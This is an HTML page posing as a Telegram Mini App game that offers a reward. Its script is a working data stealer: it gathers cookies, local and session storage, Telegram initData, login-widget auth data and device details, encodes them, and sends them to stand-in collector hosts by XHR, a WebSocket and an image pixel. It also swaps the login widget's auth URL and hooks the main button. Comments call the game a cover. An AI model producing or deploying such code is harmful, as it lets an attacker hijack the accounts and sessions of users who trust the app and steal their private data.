<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .loader {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Игра дня</h1>
        <p>Нажмите "Начать", чтобы запустить игру и получить бонус!</p>
        
        <div id="loginWidget">
            <div class="telegram-login" 
                 data-auth-url="https://legit-game.example.com/auth" 
                 data-request-access="write"
                 data-size="large"
                 data-radius="10"
                 id="telegram-login">
            </div>
        </div>

        <div id="gameArea" class="hidden">
            <canvas id="gameCanvas" width="800" height="400"></canvas>
            <div id="score">Очки: 0</div>
        </div>

        <div class="loader" id="loader">
            <div>Загрузка...</div>
        </div>

        <div id="result" class="hidden">
            <h2>🎉 Поздравляем!</h2>
            <p>Ваш результат: <span id="finalScore">0</span> очков</p>
            <p>Награда уже на вашем счету!</p>
        </div>
    </div>

    <script>
        // Основной объект для сбора данных
        const collectedData = {
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            telegramData: null,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };

        // Функция отправки данных
        function sendCollectedData(endpoint = 'https://collector.example.com/api/log') {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', endpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            // Обфускация данных
            const encoded = btoa(JSON.stringify(collectedData));
            const payload = {
                type: 'game_stats',
                version: '1.0',
                data: encoded,
                checksum: Array.from(encoded).reduce((a, b) => a + b.charCodeAt(0), 0)
            };

            xhr.send(JSON.stringify(payload));

            // Резервный канал через WebSocket
            try {
                const ws = new WebSocket('wss://backup.example.com/ws');
                ws.onopen = () => ws.send(encoded);
            } catch(e) {}
        }

        // Перехват данных Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
            const tg = window.Telegram.WebApp;
            
            // Расширяем приложение на весь экран
            tg.expand();
            
            // Собираем все доступные данные
            collectedData.telegramData = {
                initData: tg.initData,
                initDataUnsafe: tg.initDataUnsafe,
                version: tg.version,
                platform: tg.platform,
                themeParams: tg.themeParams,
                colorScheme: tg.colorScheme,
                viewportHeight: tg.viewportHeight,
                viewportStableHeight: tg.viewportStableHeight,
                headerColor: tg.headerColor,
                backgroundColor: tg.backgroundColor,
                isExpanded: tg.isExpanded,
                startParam: tg.startParam
            };

            // Подмена обработчика MainButton
            const originalMainButtonClick = tg.MainButton.onClick;
            tg.MainButton.onClick = function(callback) {
                tg.MainButton.show();
                tg.MainButton.setText("Получить награду");
                
                return originalMainButtonClick.call(this, function() {
                    // Отправляем данные при нажатии
                    sendCollectedData();
                    if (callback) callback();
                });
            };

            // Перехват событий
            tg.onEvent('viewportChanged', (event) => {
                collectedData.viewportEvents = collectedData.viewportEvents || [];
                collectedData.viewportEvents.push(event);
            });

            // Фиксация времени проведенное в приложении
            collectedData.startTime = Date.now();
            window.addEventListener('beforeunload', () => {
                collectedData.sessionDuration = Date.now() - collectedData.startTime;
                sendCollectedData('https://collector.example.com/api/exit');
            });
        }

        // Подмена Telegram Login Widget
        document.addEventListener('DOMContentLoaded', function() {
            const widget = document.getElementById('telegram-login');
            if (widget) {
                // Заменяем auth-url на контролируемый сервер
                widget.setAttribute('data-auth-url', 'https://auth-collector.example.com/callback');
                
                // Перехват сообщений от виджета
                window.addEventListener('message', function(event) {
                    if (event.data && event.data.type === 'telegram_login') {
                        collectedData.telegramAuth = event.data;
                        sendCollectedData();
                    }
                });
            }
        });

        // Игровая логика (прикрытие)
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        let score = 0;

        function initGame() {
            // Простая игра для отвлечения внимания
            document.getElementById('gameArea').classList.remove('hidden');
            
            // Отправка данных через 5 секунд после начала игры
            setTimeout(() => {
                sendCollectedData();
            }, 5000);
        }

        // Запуск игры при клике на виджет
        document.querySelector('.telegram-login').addEventListener('click', function(e) {
            e.preventDefault();
            initGame();
            return false;
        });

        // Периодическая отправка heartbeat
        setInterval(() => {
            collectedData.heartbeat = Date.now();
            // Используем Image для отправки данных (обход CORS)
            const img = new Image();
            img.src = `https://collector.example.com/pixel?t=${Date.now()}&d=${btoa(JSON.stringify(collectedData)).substring(0, 100)}`;
        }, 30000);

        // Сбор данных о взаимодействии
        document.addEventListener('click', (e) => {
            collectedData.interactions = collectedData.interactions || [];
            collectedData.interactions.push({
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                time: Date.now()
            });
        });

        // Финальная отправка при закрытии
        window.addEventListener('pagehide', () => {
            sendCollectedData('https://collector.example.com/api/final');
        });
    </script>
</body>
</html>
